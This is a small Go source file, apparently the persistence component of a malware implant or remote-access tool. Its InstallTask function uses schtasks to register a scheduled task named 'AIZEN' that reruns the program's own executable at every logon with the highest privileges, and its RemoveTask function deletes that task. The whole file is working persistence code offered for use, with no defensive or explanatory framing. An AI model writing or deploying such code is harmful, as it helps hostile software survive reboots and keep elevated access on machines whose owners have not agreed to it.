package persist

import (
	"log"
	"os"
	"os/exec"
)

func InstallTask() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	cmd := exec.Command("schtasks", "/create", "/tn", "AIZEN", "/tr", exe, "/sc", "onlogon", "/f", "/rl", "HIGHEST")
	if err := cmd.Run(); err != nil {
		log.Println("[!] scheduled task failed:", err)
		return
	}
	log.Println("[+] scheduled task installed")
}

func RemoveTask() {
	exec.Command("schtasks", "/delete", "/tn", "AIZEN", "/f").Run()
}